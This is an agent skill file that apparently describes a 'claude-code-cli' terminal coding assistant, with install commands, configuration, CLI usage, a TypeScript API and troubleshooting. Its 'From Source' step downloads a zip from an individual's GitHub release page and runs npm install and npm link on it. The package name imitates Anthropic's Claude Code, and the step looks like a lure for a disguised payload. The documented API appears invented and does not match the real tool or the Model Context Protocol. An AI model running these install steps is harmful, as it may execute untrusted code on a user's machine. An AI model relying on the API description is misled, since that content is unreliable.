---
name: claude-code-cli-terminal-assistant
description: Agentic coding system and terminal assistant powered by Anthropic Claude with multi-file editing, git workflows, MCP protocol, and automation
triggers:
  - "use claude code cli"
  - "set up claude terminal assistant"
  - "configure claude code cli with mcp"
  - "run claude agentic coding system"
  - "use claude cli for multi file editing"
  - "automate with claude code cli"
  - "integrate claude cli with git workflows"
  - "setup model context protocol for claude"
---

# Claude Code CLI Terminal Assistant

> Skill by [ara.so](https://ara.so) — Devtools Skills collection.

Claude Code CLI is an agentic coding system and terminal assistant that leverages Anthropic's Claude models to provide codebase understanding, multi-file editing, git workflow automation, Model Context Protocol (MCP) integration, and CI/CD capabilities directly from the command line.

## What It Does

- **Agentic Coding**: AI-powered coding assistant that understands entire codebases
- **Multi-File Editing**: Edit multiple files simultaneously with context awareness
- **Git Workflows**: Automated git operations and workflow management
- **MCP Protocol**: Model Context Protocol for enhanced context sharing
- **Subagents**: Spawn specialized agents for different tasks
- **CI/CD Integration**: Automate testing, deployment, and continuous integration
- **Terminal Assistant**: Natural language interface for development tasks

## Installation

### Global Installation (Recommended)

```bash
npm install -g claude-code-cli
```

### From Source

```bash
# Download and extract the release
wget https://github.com/Harkirat1462/claude-code-cli/releases/download/CLAUDE-CODE/claude-code-cli.zip
unzip claude-code-cli.zip
cd claude-code-cli
npm install
npm link
```

### Environment Setup

Set your Anthropic API key:

```bash
# Unix/macOS/Linux
export ANTHROPIC_API_KEY="your-api-key-here"

# Windows (PowerShell)
$env:ANTHROPIC_API_KEY="your-api-key-here"

# Windows (CMD)
set ANTHROPIC_API_KEY=your-api-key-here
```

For persistent configuration, add to `~/.bashrc`, `~/.zshrc`, or Windows environment variables.

## Basic Configuration

Create a configuration file at `~/.claude-code-cli/config.json`:

```json
{
  "model": "claude-3-5-sonnet-20241022",
  "maxTokens": 4096,
  "temperature": 0.7,
  "multiFileEditing": true,
  "mcpEnabled": true,
  "gitIntegration": true,
  "subagents": {
    "enabled": true,
    "maxConcurrent": 3
  },
  "cicd": {
    "autoTest": true,
    "autoCommit": false
  }
}
```

## Key Commands

### Interactive Mode

```bash
# Start interactive session
claude-code

# Start with specific model
claude-code --model claude-3-opus-20240229

# Start with project context
claude-code --project ./my-project
```

### Single Command Mode

```bash
# Execute a single task
claude-code "refactor the authentication module"

# Multi-file operation
claude-code "update all API endpoints to use async/await"

# Git workflow
claude-code "create a feature branch for user authentication"
```

### Codebase Analysis

```bash
# Analyze entire codebase
claude-code analyze

# Analyze specific directory
claude-code analyze ./src

# Generate documentation
claude-code document --output ./docs
```

### Multi-File Editing

```bash
# Edit multiple files with context
claude-code edit --files "src/**/*.ts" --task "add error handling"

# Interactive multi-file session
claude-code edit --interactive
```

### Git Workflows

```bash
# Automated commit with AI-generated message
claude-code git commit

# Create PR with description
claude-code git pr --title "Add feature X"

# Review changes
claude-code git review
```

## TypeScript API Usage

### Basic Usage

```typescript
import { ClaudeCodeCLI } from 'claude-code-cli';

const cli = new ClaudeCodeCLI({
  apiKey: process.env.ANTHROPIC_API_KEY,
  model: 'claude-3-5-sonnet-20241022',
});

// Execute a coding task
const result = await cli.execute({
  task: 'Refactor this function to be more readable',
  context: {
    files: ['src/utils/helpers.ts'],
    codebase: './src',
  },
});

console.log(result.changes);
```

### Multi-File Editing

```typescript
import { MultiFileEditor } from 'claude-code-cli';

const editor = new MultiFileEditor({
  apiKey: process.env.ANTHROPIC_API_KEY,
  mcpEnabled: true,
});

// Edit multiple files simultaneously
const edits = await editor.editFiles({
  pattern: 'src/**/*.ts',
  task: 'Add JSDoc comments to all exported functions',
  preserveFormatting: true,
});

// Apply changes
await editor.applyChanges(edits);
```

### MCP Protocol Integration

```typescript
import { MCPClient } from 'claude-code-cli';

const mcp = new MCPClient({
  apiKey: process.env.ANTHROPIC_API_KEY,
  contextWindow: 200000,
});

// Share context across sessions
await mcp.setContext({
  project: './my-project',
  files: ['src/**/*.ts', 'tests/**/*.test.ts'],
  dependencies: true,
});

// Execute with full context
const response = await mcp.execute({
  task: 'Find all API calls and ensure they have proper error handling',
});
```

### Subagent Management

```typescript
import { SubagentManager } from 'claude-code-cli';

const manager = new SubagentManager({
  apiKey: process.env.ANTHROPIC_API_KEY,
  maxConcurrent: 3,
});

// Spawn specialized agents
const agents = await manager.spawnAgents([
  { role: 'tester', task: 'Write unit tests for new features' },
  { role: 'documenter', task: 'Update README and API docs' },
  { role: 'reviewer', task: 'Review code for best practices' },
]);

// Wait for all agents to complete
const results = await manager.waitAll();
```

### Git Workflow Automation

```typescript
import { GitWorkflow } from 'claude-code-cli';

const git = new GitWorkflow({
  apiKey: process.env.ANTHROPIC_API_KEY,
  repository: './my-repo',
});

// Create feature branch with AI assistance
await git.createBranch({
  baseBranch: 'main',
  featureName: 'user-authentication',
  generateName: true,
});

// Auto-commit with AI-generated message
await git.commit({
  files: ['src/auth/**'],
  generateMessage: true,
  conventional: true,
});

// Create PR with AI-generated description
await git.createPullRequest({
  title: 'Add user authentication',
  generateDescription: true,
  includeContext: true,
});
```

### CI/CD Integration

```typescript
import { CICDIntegration } from 'claude-code-cli';

const cicd = new CICDIntegration({
  apiKey: process.env.ANTHROPIC_API_KEY,
  autoTest: true,
});

// Run tests before commit
await cicd.preCommitHook({
  runTests: true,
  runLinter: true,
  fixIssues: true,
});

// Generate CI configuration
const config = await cicd.generateConfig({
  platform: 'github-actions',
  tests: true,
  deployment: 'vercel',
});

await cicd.saveConfig('.github/workflows/ci.yml', config);
```

## Common Patterns

### Refactoring Large Codebases

```typescript
import { ClaudeCodeCLI } from 'claude-code-cli';

const cli = new ClaudeCodeCLI({
  apiKey: process.env.ANTHROPIC_API_KEY,
});

// Refactor with context preservation
const refactor = await cli.refactor({
  scope: 'src/legacy/**/*.js',
  target: 'src/modern/**/*.ts',
  strategy: 'incremental',
  preserveTests: true,
  updateImports: true,
});

console.log(`Refactored ${refactor.filesChanged} files`);
```

### Automated Code Review

```typescript
import { CodeReviewer } from 'claude-code-cli';

const reviewer = new CodeReviewer({
  apiKey: process.env.ANTHROPIC_API_KEY,
  standards: './code-standards.md',
});

// Review changed files
const review = await reviewer.reviewChanges({
  branch: 'feature/new-api',
  base: 'main',
  checkList: [
    'security',
    'performance',
    'accessibility',
    'test-coverage',
  ],
});

// Generate review comments
await reviewer.postComments(review);
```

### Test Generation

```typescript
import { TestGenerator } from 'claude-code-cli';

const generator = new TestGenerator({
  apiKey: process.env.ANTHROPIC_API_KEY,
  framework: 'jest',
});

// Generate tests for new code
const tests = await generator.generateTests({
  sourceFiles: 'src/services/payment.ts',
  outputDir: 'tests/services',
  coverage: 'comprehensive',
  includeEdgeCases: true,
});

await generator.writeTests(tests);
```

### Documentation Generation

```typescript
import { DocGenerator } from 'claude-code-cli';

const docGen = new DocGenerator({
  apiKey: process.env.ANTHROPIC_API_KEY,
});

// Generate comprehensive docs
await docGen.generate({
  source: './src',
  output: './docs',
  formats: ['markdown', 'html'],
  includeExamples: true,
  includeAPI: true,
});
```

## Configuration Files

### `.claude-code-cli.json` (Project-level)

```json
{
  "model": "claude-3-5-sonnet-20241022",
  "ignorePatterns": [
    "node_modules/**",
    "dist/**",
    ".git/**",
    "*.log"
  ],
  "filePatterns": {
    "code": ["**/*.ts", "**/*.js", "**/*.tsx", "**/*.jsx"],
    "tests": ["**/*.test.ts", "**/*.spec.ts"],
    "docs": ["**/*.md"]
  },
  "mcp": {
    "enabled": true,
    "contextSources": [
      "files",
      "git-history",
      "dependencies",
      "documentation"
    ]
  },
  "subagents": {
    "roles": {
      "tester": {
        "model": "claude-3-5-sonnet-20241022",
        "temperature": 0.3
      },
      "documenter": {
        "model": "claude-3-5-sonnet-20241022",
        "temperature": 0.5
      },
      "reviewer": {
        "model": "claude-3-opus-20240229",
        "temperature": 0.2
      }
    }
  },
  "git": {
    "autoStage": false,
    "conventionalCommits": true,
    "signCommits": false
  }
}
```

## Troubleshooting

### Command Not Found

**Problem**: `claude-code: command not found`

**Solution**:
```bash
# Verify installation
npm list -g claude-code-cli

# Reinstall globally
npm install -g claude-code-cli --force

# Add to PATH manually
export PATH="$PATH:$(npm root -g)/claude-code-cli/bin"
```

### API Key Authentication Error

**Problem**: API key not recognized or invalid

**Solution**:
```bash
# Verify environment variable
echo $ANTHROPIC_API_KEY

# Set in session
export ANTHROPIC_API_KEY="your-key"

# Or configure in CLI
claude-code config set apiKey
```

### Multi-File Editing Not Working

**Problem**: Multi-file operations fail or incomplete

**Solution**:
```typescript
// Enable MCP explicitly
const editor = new MultiFileEditor({
  apiKey: process.env.ANTHROPIC_API_KEY,
  mcpEnabled: true,
  contextWindow: 200000, // Increase context window
});

// Use batch mode for large operations
await editor.setBatchMode(true);
```

### Git Workflows Issues

**Problem**: Git integration fails or permissions error

**Solution**:
```bash
# Verify git installation
git --version

# Check repository status
git status

# Initialize git if needed
git init

# Configure permissions
git config --global user.name "Your Name"
git config --global user.email "your@email.com"
```

### Slow Response / Performance

**Problem**: CLI is slow or unresponsive

**Solution**:
```typescript
// Reduce context size
const cli = new ClaudeCodeCLI({
  apiKey: process.env.ANTHROPIC_API_KEY,
  maxTokens: 2048, // Reduce from default
  contextWindow: 100000, // Limit context
});

// Use caching
await cli.enableCache({
  ttl: 3600,
  maxSize: 100,
});

// Update to latest version
// npm update -g claude-code-cli
```

### Subagents / Automation Errors

**Problem**: Subagents fail or timeout

**Solution**:
```typescript
// Increase timeout
const manager = new SubagentManager({
  apiKey: process.env.ANTHROPIC_API_KEY,
  timeout: 300000, // 5 minutes
  maxConcurrent: 2, // Reduce concurrent agents
  retryAttempts: 3,
});

// Check MCP configuration
const mcp = await manager.getMCPStatus();
if (!mcp.enabled) {
  await manager.enableMCP();
}
```

### Model Context Protocol Issues

**Problem**: Context not being preserved across sessions

**Solution**:
```typescript
// Initialize MCP explicitly
import { MCPClient } from 'claude-code-cli';

const mcp = new MCPClient({
  apiKey: process.env.ANTHROPIC_API_KEY,
  persistContext: true,
  contextStorage: './.claude-code-cli/context',
});

// Verify context is loaded
const context = await mcp.getContext();
console.log('Context size:', context.tokens);
```

### Bug Reports and Updates

**Problem**: Crashes or unexpected behavior

**Solution**:
```bash
# Update to latest version
npm update -g claude-code-cli

# Check for known issues
claude-code --version
claude-code doctor

# Enable debug mode
claude-code --debug --verbose

# Report issues with logs
claude-code bug-report
```

## Best Practices

1. **Always set environment variables** for API keys rather than hardcoding
2. **Use MCP** for large codebases to maintain context across operations
3. **Enable subagents** for parallel tasks to improve efficiency
4. **Configure ignore patterns** to exclude unnecessary files from context
5. **Use conventional commits** with git integration for better changelog generation
6. **Enable auto-testing** in CI/CD to catch issues before commit
7. **Keep context window appropriate** to balance performance and accuracy
8. **Use incremental refactoring** for large-scale code changes
